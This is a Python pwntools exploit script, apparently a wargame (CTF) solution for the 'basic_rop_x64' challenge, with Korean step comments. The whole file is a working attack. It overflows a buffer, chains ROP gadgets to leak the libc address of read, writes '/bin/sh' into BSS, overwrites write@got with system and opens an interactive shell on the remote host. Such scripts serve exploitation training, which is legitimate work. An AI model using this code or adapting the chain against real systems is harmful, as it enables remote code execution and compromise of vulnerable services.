from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))

#context.log_level = 'debug'

p = remote("host3.dreamhack.games", 18939)
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")
r = ROP(e)


# [1] 필요한 정보 수집
read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]
bss = e.bss()

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
ret = r.find_gadget(['ret'])[0]

payload = b'A'*72



# [2] wrtie(1, read@got, 16) => read() 실제 주소 흭득
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(16)
payload += p64(write_plt)


# [3] read(0, bss, 8) => BSS 영역에 "/bin/sh" 쓰기
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss) + p64(8)
payload += p64(read_plt)


# [4] read(0, write@got, 16) => write@got를 system로 got overwrite
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(write_got) + p64(16)
payload += p64(read_plt)


# [5] write("/bin/sh") => system("/bin/sh")가 호출 됨
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(write_plt)



# [6] payload, data 전송
p.send(payload)

p.recvuntil(b'A' * 64)
read = u64(p.recvn(6)+b'\x00'*2)
lb = read - read_offset
system = lb + system_offset

slog("libc base", lb)
slog("read", read)
slog("system", system)

p.send(b"/bin/sh\x00")
p.send(p64(system))
p.interactive()

